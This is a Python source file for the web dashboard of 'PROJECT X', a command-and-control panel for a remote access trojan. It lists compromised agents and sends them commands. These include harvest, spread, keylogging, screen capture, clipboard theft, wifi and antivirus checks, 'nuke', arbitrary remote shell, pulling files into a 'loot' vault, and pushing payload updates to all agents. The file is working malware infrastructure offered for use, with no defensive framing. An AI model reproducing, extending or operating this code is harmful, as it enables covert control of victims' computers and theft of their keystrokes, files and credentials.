#!/usr/bin/env python3
# ============================================================================
#  PROJECT X  ·  web.py  ·  phone dashboard + login + loot + push update
#  PX_PASS / PX_TOKEN / PX_PAYLOAD   or  --pass / --token / --payload
# ============================================================================
import base64, hmac, json, os, secrets, socket, sys, threading, time, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import controller as CT

TOKEN = os.environ.get("PX_TOKEN") or secrets.token_hex(8)
PASS  = os.environ.get("PX_PASS") or ""
WEB   = 8080
LOOT  = os.path.abspath("loot")
SESSIONS = set()
FAILS = {"n": 0, "until": 0.0}


def save_loot(agent, name, blob):
    d = os.path.join(LOOT, agent or "unknown"); os.makedirs(d, exist_ok=True)
    p = os.path.join(d, name); i = 1
    while os.path.exists(p):
        r, e = os.path.splitext(name); p = os.path.join(d, f"{r}_{i}{e}"); i += 1
    open(p, "wb").write(blob)
    return os.path.relpath(p, LOOT).replace(os.sep, "/")


def loot_list():
    out = []
    if not os.path.isdir(LOOT): return out
    for ag in sorted(os.listdir(LOOT)):
        d = os.path.join(LOOT, ag)
        if not os.path.isdir(d): continue
        for f in sorted(os.listdir(d), reverse=True):
            fp = os.path.join(d, f)
            try: st = os.stat(fp)
            except OSError: continue
            out.append({"agent": ag, "name": f, "size": st.st_size,
                        "mtime": int(st.st_mtime), "p": f"{ag}/{f}"})
    return out


LOGIN = r"""<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>PROJECT X</title><style>
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
background:#0b0e14;color:#c9d1d9;font:14px ui-monospace,Menlo,Consolas,monospace}
form{width:min(340px,90vw);background:#11151f;border:1px solid #1e2533;border-radius:12px;padding:22px}
h1{margin:0 0 4px;font-size:17px;letter-spacing:2px}
p{margin:0 0 16px;color:#6e7b91;font-size:12px}
input{width:100%;box-sizing:border-box;background:#171c28;color:#c9d1d9;border:1px solid #263043;
border-radius:8px;padding:12px;font:inherit;font-size:16px;margin-bottom:10px}
button{width:100%;background:#1f6feb;color:#fff;border:0;border-radius:8px;padding:12px;
font:inherit;font-size:15px;cursor:pointer}
.err{color:#f85149;font-size:12.5px;margin-bottom:10px}
</style></head><body><form method=post action=/login>
<h1>PROJECT X</h1><p>remote administration framework</p>
<div class=err>%ERR%</div>
<input type=password name=password placeholder="password" autofocus autocomplete=current-password>
<button>unlock</button></form></body></html>"""


PAGE = r"""<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>PROJECT X</title><style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;background:#0b0e14;color:#c9d1d9;font:14px/1.5 ui-monospace,Menlo,Consolas,monospace}
header{position:sticky;top:0;background:#11151f;border-bottom:1px solid #1e2533;padding:8px;display:flex;gap:6px;align-items:center;z-index:9;padding-top:calc(8px + env(safe-area-inset-top))}
#dot{width:9px;height:9px;border-radius:50%;background:#f85149;flex:0 0 auto}
#dot.on{background:#3fb950;box-shadow:0 0 8px #3fb950}
select,button,input{background:#171c28;color:#c9d1d9;border:1px solid #263043;border-radius:8px;padding:9px 10px;font:inherit;font-size:15px}
button{cursor:pointer}button:active{background:#22304a}
select{flex:1;min-width:0}
#stat{background:#0e131d;border-bottom:1px solid #1e2533;padding:5px 10px;font-size:11.5px;color:#6e7b91;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
nav{display:flex;gap:4px;overflow-x:auto;padding:6px 8px;background:#0e131d;border-bottom:1px solid #1e2533;position:sticky;top:calc(46px + env(safe-area-inset-top));z-index:8}
nav button{padding:7px 12px;font-size:13px;border-radius:20px;white-space:nowrap}
nav button.act{background:#1f6feb;border-color:#1f6feb;color:#fff}
main{padding:10px;padding-bottom:calc(30px + env(safe-area-inset-bottom))}
section{display:none}section.on{display:block}
pre{background:#0e131d;border:1px solid #1e2533;border-radius:8px;padding:10px;white-space:pre-wrap;word-break:break-all;max-height:58vh;overflow:auto;font-size:12.5px;margin:0 0 8px}
.chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px}
.chips button{padding:6px 11px;font-size:12.5px}
.row{display:flex;gap:6px;margin-bottom:8px}.row input{flex:1;min-width:0}
.ent{display:flex;justify-content:space-between;align-items:center;gap:8px;padding:11px 10px;border-bottom:1px solid #161c28}
.ent:active{background:#161c28}.ent b{font-weight:600;word-break:break-all}
.ent span{color:#6e7b91;font-size:12px;flex:0 0 auto}
.ent button{padding:5px 9px;font-size:12px}
a{color:#58a6ff;text-decoration:none}
img{width:100%;border-radius:8px;border:1px solid #1e2533;display:block}
#toast{position:fixed;left:10px;right:10px;bottom:calc(14px + env(safe-area-inset-bottom));background:#1f6feb;color:#fff;padding:11px;border-radius:8px;opacity:0;transition:.2s;pointer-events:none;font-size:13px}
#toast.on{opacity:1}
table{width:100%;border-collapse:collapse;font-size:12.5px}
td{padding:5px 4px;border-bottom:1px solid #161c28;vertical-align:top}
td:first-child{color:#6e7b91;width:38%}
.pill{background:#161c28;border-radius:20px;padding:2px 9px;font-size:11.5px;color:#6e7b91}
</style></head><body>
<header><div id=dot></div>
  <select id=ag onchange="AID=this.value;localStorage.pxa=AID;stat()"></select>
  <button onclick="load()">&#8635;</button>
  <button onclick="location.href='/logout'">&#9099;</button></header>
<div id=stat>...</div>
<nav>
  <button class=act data-t=con onclick="tab('con',this)">console</button>
  <button data-t=fil onclick="tab('fil',this);ls('')">files</button>
  <button data-t=scr onclick="tab('scr',this);shot()">screen</button>
  <button data-t=key onclick="tab('key',this);keys()">keys</button>
  <button data-t=loot onclick="tab('loot',this);loot()">loot</button>
  <button data-t=inf onclick="tab('inf',this);info()">info</button>
</nav>
<main>
<section id=con class=on>
  <div class=chips>
    <button onclick="C('harvest')">harvest</button>
    <button onclick="C('update')">push update</button>
    <button onclick="C('ps')">ps</button>
    <button onclick="C('where')">where</button>
    <button onclick="C('freeze')">freeze</button>
    <button onclick="C('spread')">spread</button>
    <button onclick="C('wifi')">wifi</button>
    <button onclick="C('av')">av</button>
    <button onclick="C('clip')">clipboard</button>
    <button onclick="C('power',{mode:'lock'})">lock</button>
    <button onclick="C('power',{mode:'restart'})">restart</button>
    <button onclick="C('power',{mode:'off'})">off</button>
    <button onclick="C('msg',{text:'boo'})">msg</button>
    <button onclick="C('nuke')">nuke</button>
  </div>
  <pre id=out>ready.</pre>
  <div class=row><input id=cin placeholder="command..." onkeydown="if(event.key=='Enter')shell(this.value)">
  <button onclick="shell(document.getElementById('cin').value)">run</button></div>
</section>
<section id=fil>
  <div class=row><input id=fp placeholder="path" onkeydown="if(event.key=='Enter')ls(this.value)">
  <button onclick="ls(document.getElementById('fp').value)">go</button></div>
  <pre id=fl style=max-height:none></pre>
</section>
<section id=scr>
  <div class=chips><button onclick="shot()">refresh</button>
  <label style=font-size:12.5px><input type=checkbox id=auto> auto 5s</label></div>
  <img id=shotimg>
</section>
<section id=key>
  <div class=chips><button onclick="C('keylog',{op:'start'})">start</button>
  <button onclick="C('keylog',{op:'stop'})">stop</button>
  <button onclick="keys()">dump</button>
  <button onclick="C('keylog',{op:'clear'})">clear</button></div>
  <pre id=kl></pre>
</section>
<section id=loot>
  <div class=chips><button onclick="loot()">refresh</button>
  <button onclick="allUpdate()">update all agents</button>
  <button onclick="wipe()">clear vault</button></div>
  <div id=lt></div>
</section>
<section id=inf><table id=it></table></section>
</main><div id=toast></div>
<script>
const T = new URLSearchParams(location.search).get('t') || localStorage.pxt || '';
localStorage.pxt = T;
let AID = localStorage.pxa || '';
const $ = id => document.getElementById(id);
const api = async (p,o) => { const r = await fetch(p,o); if(!r.ok) throw new Error(await r.text());
  return r.headers.get('content-type').includes('json') ? r.json() : r.text(); };
function toast(m){ $('toast').textContent=m; $('toast').className='on'; setTimeout(()=>$('toast').className='',2200); }
function tab(n,b){ document.querySelectorAll('section').forEach(s=>s.classList.toggle('on',s.id==n));
  document.querySelectorAll('nav button').forEach(x=>x.classList.toggle('act',x==b)); }
async function load(){
  const l = await api('/api/agents?t='+T);
  $('ag').innerHTML = l.length ? l.map(a=>`<option value="${a.id}">${a.id} | ${a.info.user}@${a.info.host}${a.info.admin?' [adm]':''}</option>`).join('') : '<option>no agents</option>';
  if(l.length){ if(!l.find(a=>a.id==AID)) AID=l[0].id; $('ag').value=AID; localStorage.pxa=AID; }
  $('dot').className = l.length ? 'on' : '';
  stat();
}
async function stat(){
  if(!AID) return;
  try{ const d = await api('/api/stat?t='+T+'&agent='+AID);
    if(d && d.window!==undefined)
      $('stat').textContent = `cpu ${d.cpu}% · ram ${d.ram}% · idle ${d.idle}s · ${d.window||'-'}` +
        (d.battery&&d.battery.pct<255?` · bat ${d.battery.pct}%`:'') + (d.clip?` · clip: ${d.clip.slice(0,40)}`:'');
  }catch(e){}
}
async function run(cmd,args){
  if(!AID) return toast('no agent');
  const r = await api('/api/cmd?t='+T,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({agent:AID,cmd,args:args||{},timeout:600})});
  if(!r.ok) throw new Error(r.err||'fail'); return r.data;
}
async function C(cmd,args){
  const o=$('out'); o.textContent += '\n$ '+cmd+'\n';
  try{ const d = await run(cmd,args); o.textContent += typeof d==='string'?d:JSON.stringify(d,null,1); }
  catch(e){ o.textContent += '! '+e.message; }
  o.scrollTop=o.scrollHeight; if(cmd=='harvest'||cmd=='update') loot(); }
async function shell(c){ if(!c) return; const o=$('out'); o.textContent += '\n> '+c+'\n';
  try{ const d = await run('shell',{cmd:c}); o.textContent += d.out + (d.rc?'\n[rc '+d.rc+']':''); }
  catch(e){ o.textContent += '! '+e.message; } o.scrollTop=o.scrollHeight; $('cin').value=''; }
async function ls(p){ $('fp').value=p;
  const d = await api('/api/list?t='+T+'&agent='+AID+'&path='+encodeURIComponent(p||''));
  const up = (d.path||'').split('\\').slice(0,-1).join('\\');
  let h = `<div class=ent onclick="ls('${up.replace(/\\/g,'\\\\')}')"><b>..</b></div>`;
  h += (d.entries||[]).map(e=>`<div class=ent onclick="${e.dir?'ls':'dl'}('${(d.path+'\\'+e.name).replace(/\\/g,'\\\\')}')">
    <b>${e.dir?'[d] ':'&nbsp;&nbsp;&nbsp;&nbsp;'}${e.name}</b><span>${e.dir?'':(e.size/1024).toFixed(1)+'K'}</span></div>`).join('');
  $('fl').innerHTML = h; }
function dl(p){ location.href = '/api/file?t='+T+'&agent='+AID+'&path='+encodeURIComponent(p); }
function shot(){ $('shotimg').src = '/api/screen?t='+T+'&agent='+AID+'&r='+Date.now(); }
async function keys(){ $('kl').textContent = await api('/api/keylog?t='+T+'&agent='+AID); }
async function info(){ const d = await api('/api/info?t='+T+'&agent='+AID);
  $('it').innerHTML = Object.entries(d).map(([k,v])=>`<tr><td>${k}</td><td>${String(v)}</td></tr>`).join(''); }
async function loot(){ const l = await api('/api/loot?t='+T);
  if(!l.length) return $('lt').innerHTML='<div class=ent><b>vault empty</b></div>';
  $('lt').innerHTML = l.map(f=>`<div class=ent>
    <div><b><a href="/api/lootget?t=${T}&p=${encodeURIComponent(f.p)}">${f.name}</a></b><br>
    <span class=pill>${f.agent}</span> <span>${(f.size/1024).toFixed(1)} KB</span></div>
    <button onclick="del('${f.p}')">x</button></div>`).join(''); }
async function del(p){ await api('/api/lootdel?t='+T+'&p='+encodeURIComponent(p)); loot(); }
async function wipe(){ if(confirm('clear vault?')){ await api('/api/lootwipe?t='+T); loot(); } }
async function allUpdate(){ const r = await api('/api/updateall?t='+T,{method:'POST'});
  toast('update pushed to '+r.count+' agents'); }
setInterval(load, 5000);
setInterval(stat, 5000);
setInterval(()=>{ if($('auto').checked && $('scr').classList.contains('on')) shot(); }, 5000);
load();
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    server_version = "PX"

    def log_message(self, *a): pass

    def _send(self, code, body, ctype="application/json; charset=utf-8", extra=None):
        if isinstance(body, str): body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or {}).items(): self.send_header(k, v)
        self.end_headers()
        if body: self.wfile.write(body)

    def _j(self, o, code=200): self._send(code, json.dumps(o))
    def q(self): return urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)

    def _sid(self):
        for part in self.headers.get("Cookie", "").split(";"):
            k, _, v = part.strip().partition("=")
            if k == "pxs": return v
        return None

    def authed(self):
        s = self._sid()
        if s and s in SESSIONS: return True
        return self.q().get("t", [""])[0] == TOKEN or self.headers.get("X-Token") == TOKEN

    def _login(self):
        sid = secrets.token_hex(16); SESSIONS.add(sid)
        return {"Set-Cookie": f"pxs={sid}; Path=/; HttpOnly; SameSite=Lax; Max-Age=604800"}

    def A(self): return CT.AGENTS.get(self.q().get("agent", [""])[0])

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path
        if p == "/":
            if self.q().get("t", [""])[0] == TOKEN:
                return self._send(200, PAGE, "text/html; charset=utf-8", self._login())
            if not self.authed():
                return self._send(200, LOGIN.replace("%ERR%", "wrong password" if self.q().get("e") else ""),
                                  "text/html; charset=utf-8")
            return self._send(200, PAGE, "text/html; charset=utf-8")
        if p == "/logout":
            s = self._sid()
            if s: SESSIONS.discard(s)
            return self._send(302, b"", "text/plain",
                              {"Set-Cookie": "pxs=; Path=/; Max-Age=0", "Location": "/"})
        if not self.authed(): return self._j({"error": "unauthorized"}, 401)

        if p == "/api/agents": return self._j([{"id": a.id, "info": a.info} for a in CT.AGENTS.values()])
        if p == "/api/loot":   return self._j(loot_list())
        if p == "/api/lootget":
            fp = os.path.join(LOOT, self.q().get("p", [""])[0])
            if not os.path.isfile(fp): return self._send(404, b"nope", "text/plain")
            return self._send(200, open(fp, "rb").read(), "application/octet-stream",
                              {"Content-Disposition": f'attachment; filename="{os.path.basename(fp)}"'})
        if p == "/api/lootdel":
            try: os.remove(os.path.join(LOOT, self.q().get("p", [""])[0]))
            except OSError: pass
            return self._j({"ok": True})
        if p == "/api/lootwipe":
            import shutil; shutil.rmtree(LOOT, ignore_errors=True); return self._j({"ok": True})

        a = self.A()
        if not a: return self._j({"error": "no agent"}, 400)
        try:
            if p == "/api/info":   return self._j(a.req("info").get("data") or {})
            if p == "/api/stat":   return self._j(a.stat or a.req("stat").get("data") or {})
            if p == "/api/list":
                return self._j(a.req("ls", {"path": self.q().get("path", [""])[0] or None}).get("data") or {})
            if p == "/api/file":
                a.req("get", {"path": self.q().get("path", [""])[0]}, timeout=900)
                got = a.collect(a._n)
                if not got: return self._send(404, b"no data", "text/plain")
                save_loot(a.id, got[0], got[1])
                return self._send(200, got[1], "application/octet-stream",
                                  {"Content-Disposition": f'attachment; filename="{got[0]}"'})
            if p == "/api/screen":
                d = a.req("screen", timeout=180).get("data") or {}
                return self._send(200, base64.b64decode(d["png"]), "image/png")
            if p == "/api/keylog":
                return self._send(200, a.req("keylog", {"op": "dump"}).get("data", ""),
                                  "text/plain; charset=utf-8")
        except Exception as e:
            return self._j({"error": str(e)}, 500)
        self._j({"error": "not found"}, 404)

    def do_POST(self):
        p = urllib.parse.urlparse(self.path).path
        if p == "/login":
            n = int(self.headers.get("Content-Length", 0))
            form = urllib.parse.parse_qs(self.rfile.read(n).decode("utf-8", "replace"))
            pw = (form.get("password") or [""])[0]
            if FAILS["until"] > time.time(): time.sleep(0.3)
            if hmac.compare_digest(pw, PASS):
                FAILS["n"] = 0
                return self._send(302, b"", "text/plain", dict(self._login(), Location="/"))
            FAILS["n"] += 1
            if FAILS["n"] >= 10: FAILS["until"] = time.time() + 15; FAILS["n"] = 0
            time.sleep(0.5)
            return self._send(302, b"", "text/plain", {"Location": "/?e=1"})
        if not self.authed(): return self._j({"error": "unauthorized"}, 401)
        if p == "/api/updateall":
            n = 0
            for ag in list(CT.AGENTS.values()):
                threading.Thread(target=lambda x=ag: x.req("update", {}, timeout=300), daemon=True).start()
                n += 1
            return self._j({"count": n})
        n = int(self.headers.get("Content-Length", 0))
        try: body = json.loads(self.rfile.read(n) or b"{}")
        except Exception: body = {}
        a = CT.AGENTS.get(body.get("agent", ""))
        if not a: return self._j({"ok": False, "err": "no agent"})
        cmd, args = body.get("cmd"), body.get("args") or {}
        r = a.req(cmd, args, timeout=body.get("timeout", 600))
        if cmd == "harvest" and r.get("ok"):
            save_loot(a.id, f"harvest_{time.strftime('%Y%m%d_%H%M%S')}.json",
                      json.dumps(r["data"], indent=1).encode())
        self._j({"ok": r.get("ok"), "data": r.get("data"), "err": r.get("err")})


def listen(port, tls=None):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(64)
    if tls:
        import ssl
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(*tls)
        srv = ctx.wrap_socket(srv, server_side=True)
    while True:
        try: CT.client_thread(*srv.accept())
        except Exception: pass


if __name__ == "__main__":
    a = sys.argv[1:]
    lport = int(a[a.index("--listen") + 1]) if "--listen" in a else CT.PORT
    WEB   = int(a[a.index("--web") + 1]) if "--web" in a else WEB
    if "--pass" in a:    PASS = a[a.index("--pass") + 1]
    if "--token" in a:   TOKEN = a[a.index("--token") + 1]
    if "--payload" in a: CT.PAYLOAD = a[a.index("--payload") + 1]
    tls = None
    if "--tls" in a:
        i = a.index("--tls"); tls = (a[i + 1], a[i + 2])
    if not PASS:
        PASS = secrets.token_urlsafe(9)
        print(f"\n  no PX_PASS set - generated password: {PASS}")
    CT.PORT = lport
    os.makedirs(LOOT, exist_ok=True)
    threading.Thread(target=listen, args=(lport, tls), daemon=True).start()
    print(f"\n  agents    -> 0.0.0.0:{lport}{'  [TLS]' if tls else ''}")
    print(f"  dashboard -> http://<your-ip>:{WEB}/")
    print(f"  shortcut  -> http://<your-ip>:{WEB}/?t={TOKEN}")
    print(f"  vault     -> {LOOT}")
    print(f"  payload   -> {CT.PAYLOAD or '(unset - self-update disabled)'}\n")
    ThreadingHTTPServer(("0.0.0.0", WEB), H).serve_forever()